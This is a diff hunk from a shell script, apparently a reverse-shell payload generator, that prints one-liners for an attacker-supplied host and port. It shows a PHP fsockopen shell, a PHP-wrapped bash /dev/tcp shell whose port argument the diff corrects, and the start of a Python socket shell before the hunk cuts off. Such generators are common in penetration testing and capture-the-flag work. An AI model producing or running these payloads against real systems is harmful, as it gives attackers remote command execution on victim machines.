@@ -21,7 +21,7 @@ else
 
                 elif [ $choice == "3" ]; then
                         echo -e "\nphp -r '\$sock=fsockopen("$1",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)\n\n\t\tOR\t\
-t\n\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"$1"/$1 0>&1'\");?>\n"
+t\n\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'\");?>\n"
 
                 elif [ $choice == "4" ]; then
                         echo -e "\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno()
